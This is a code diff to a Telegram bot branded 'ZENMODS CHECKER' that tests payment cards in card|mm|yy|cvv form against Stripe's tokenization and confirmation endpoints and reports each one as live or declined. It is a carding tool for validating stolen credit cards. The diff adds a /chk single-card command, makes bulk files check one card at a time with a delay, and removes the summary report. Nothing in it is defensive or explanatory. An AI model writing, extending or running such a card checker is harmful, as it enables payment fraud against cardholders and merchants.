@@ -200,7 +200,7 @@ def check_single_cc(cc_line, session):
                 error = "Unknown Stripe Tokenization Error"
             
             if 'code' in error:
-                return f"ZENMODS CHECKER ⚡\nCCN ✅ (Approved Check)\n{card}\nReason: {error}"
+                return f"ZENMODS CHECKER ⚡\nCCN ✅\n{card}\nReason: {error}"
             else:
                 return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\nReason: {error}"
         else:
@@ -238,7 +238,7 @@ def check_single_cc(cc_line, session):
             if res_json.get('success') == False:
                 error = res_json.get('data', {}).get('error', {}).get('message', 'Unknown confirmation error')
                 if 'code' in error:
-                    return f"ZENMODS CHECKER ⚡\nCCN ✅ (Approved Check)\n{card}\nReason: {error}"
+                    return f"ZENMODS CHECKER ⚡\nCCN ✅\n{card}\nReason: {error}"
                 else:
                     return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\nReason: {error}"
             else:
@@ -254,44 +254,20 @@ def process_bulk_file(chat_id, file_content):
         bot.send_message(chat_id, "⚠️ File is empty or no cards found!")
         return
 
-    bot.send_message(chat_id, f"⚡ **Zenmods Live Sequential Engine** ⚡\nTotal cards found: `{total_cards}`.\n🚀 Checking cards one by one with detailed feedback...")
+    bot.send_message(chat_id, f"⚡ **Zenmods Strict Single Checker** ⚡\nTotal cards: `{total_cards}`.\n🚀 Checking strictly 1 by 1...")
 
-    approved_count = 0
-    ccn_count = 0
-    declined_count = 0
-    error_count = 0
-
-    detailed_results = []
     session = manage_session_file()
-    
     if not session:
         bot.send_message(chat_id, "❌ Session creation failed!")
         return
 
     for index, card_line in enumerate(lines, start=1):
         res = check_single_cc(card_line, session)
-        detailed_results.append(res)
-        
-        # প্রতিটা কার্ড চেক শেষে সাথে সাথে মেসেজ পাঠানো
-        bot.send_message(chat_id, f"📌 **Result [{index}/{total_cards}]**:\n\n{res}")
+        # একদম ১টা কার্ড চেক শেষ হওয়ামাত্রই রিপোর্ট পাঠানো হবে
+        bot.send_message(chat_id, f"📌 **Card [{index}/{total_cards}] Report:**\n\n{res}")
+        time.sleep(2) # ধীরেসুস্থে ১টা করে চেক করার জন্য বিরতি
 
-        if "Approved ✅" in res:
-            approved_count += 1
-        elif "CCN ✅" in res:
-            ccn_count += 1
-        elif "Declined ❌" in res:
-            declined_count += 1
-        else:
-            error_count += 1
-
-        time.sleep(1)
-
-    report = f"📊 **ZENMODS FINAL CHECK REPORT** 📊\n\nTotal Checked: `{total_cards}`\nApproved ✅: `{approved_count}`\nCCN ✅: `{ccn_count}`\nDeclined ❌: `{declined_count}`\nErrors: `{error_count}`\n\n🏁 All checks completed!"
-    bot.send_message(chat_id, report)
-
-    file_bytes = io.BytesIO("\n\n".join(detailed_results).encode("utf-8"))
-    file_bytes.name = "Zenmods_Detailed_Stripe_Report.txt"
-    bot.send_document(chat_id, file_bytes, caption="Zenmods Detailed Stripe Report")
+    bot.send_message(chat_id, "🏁 **All cards in the file have been checked one by one!**")
 
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
@@ -308,6 +284,28 @@ def authorize_user(message):
             bot.reply_to(message, "❌ Invalid secret code!")
     except Exception as e:
         bot.reply_to(message, "⚠️ An error occurred.")
+
+@bot.message_handler(commands=['chk'])
+def handle_single_card_cmd(message):
+    chat_id = message.chat.id
+    if chat_id not in authorized_users:
+        bot.reply_to(message, "⛔ You are not authorized! Use `/auth <secret_code>` first.")
+        return
+    
+    parts = message.text.split(maxsplit=1)
+    if len(parts) < 2:
+        bot.reply_to(message, "⚠️ Format: `/chk card|mm|yy|cvv`")
+        return
+    
+    card_line = parts[1].strip()
+    bot.send_message(chat_id, "🔍 Checking single card...")
+    session = manage_session_file()
+    if not session:
+        bot.send_message(chat_id, "❌ Session creation failed!")
+        return
+    
+    res = check_single_cc(card_line, session)
+    bot.send_message(chat_id, f"📌 **Single Card Report:**\n\n{res}")
 
 @bot.message_handler(content_types=['document'])
 def handle_document(message):
